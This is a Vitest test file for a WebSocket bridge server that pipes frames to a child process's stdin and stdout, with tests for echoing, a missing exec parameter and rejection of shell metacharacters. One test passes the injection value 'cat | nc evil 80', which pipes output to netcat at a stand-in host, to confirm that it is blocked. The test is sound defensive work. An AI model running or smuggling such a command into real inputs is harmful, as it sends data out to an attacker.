import { describe, it, expect, afterEach } from 'vitest'
import WebSocket from 'ws'
import { createBridgeServer } from '../src/server.js'

async function open(port: number, qs: string): Promise<WebSocket> {
  const ws = new WebSocket(`ws://127.0.0.1:${port}/bridge?${qs}`)
  await new Promise<void>((resolve, reject) => {
    ws.once('open', () => resolve())
    ws.once('error', reject)
  })
  return ws
}

function listen(server: import('node:http').Server): Promise<number> {
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => {
      const addr = server.address() as import('node:net').AddressInfo
      resolve(addr.port)
    })
  })
}

describe('createBridgeServer', () => {
  it('pipes WS text frames to child stdin and child stdout back as text frames', async () => {
    const bridge = createBridgeServer({ allowShell: false })
    const port = await listen(bridge.server)

    const ws = await open(port, 'exec=cat&protocol=2025-11-25')

    const payload = '{"jsonrpc":"2.0","id":1,"method":"ping"}'
    ws.send(payload)

    const received = await new Promise<string>((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error('timeout waiting for echo')), 1000)
      ws.on('message', (data) => { clearTimeout(timer); resolve(data.toString()) })
    })

    try {
      expect(received).toBe(payload)
    } finally {
      ws.close()
      await new Promise<void>((resolve) => bridge.close(resolve))
    }
  })

  it('closes WS with code 4001 when exec is missing', async () => {
    const bridge = createBridgeServer({ allowShell: false })
    const port = await listen(bridge.server)

    const ws = new WebSocket(`ws://127.0.0.1:${port}/bridge?protocol=2025-11-25`)
    const code = await new Promise<number>((resolve, reject) => {
      ws.once('close', (c) => resolve(c))
      ws.once('error', reject)
    })

    await new Promise<void>((resolve) => bridge.close(resolve))
    expect(code).toBe(4001)
  })

  it('rejects shell-metachar exec with close code 4002', async () => {
    const bridge = createBridgeServer({ allowShell: false })
    const port = await listen(bridge.server)

    const ws = new WebSocket(
      `ws://127.0.0.1:${port}/bridge?exec=${encodeURIComponent('cat | nc evil 80')}&protocol=2025-11-25`,
    )
    const code = await new Promise<number>((resolve, reject) => {
      ws.once('close', (c) => resolve(c))
      ws.once('error', reject)
    })

    await new Promise<void>((resolve) => bridge.close(resolve))
    expect(code).toBe(4002)
  })
})
